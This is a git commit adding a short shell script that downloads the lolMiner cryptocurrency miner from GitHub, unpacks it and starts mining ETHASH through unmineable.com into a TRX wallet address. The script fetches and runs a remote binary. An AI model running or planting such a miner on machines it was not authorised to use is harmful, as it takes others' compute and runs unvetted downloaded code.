b13cf15c0b1669f966867e1d5dd9da59298470cd
ryaan221 <93488007+ryaan221@users.noreply.github.com>
2021-11-04 10:15:44 +0000

    Create ganteng2.sh

---
+++ ganteng2.sh
@@ -0,0 +1,4 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz
+tar -xf lolMiner_v1.32a_Lin64.tar.gz
+cd 1.32a
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TA5vFG9zqRodRtuQtMy1cLDrKiYUCbTkm4.3#df70-vshw --ethstratum ETHPROXY
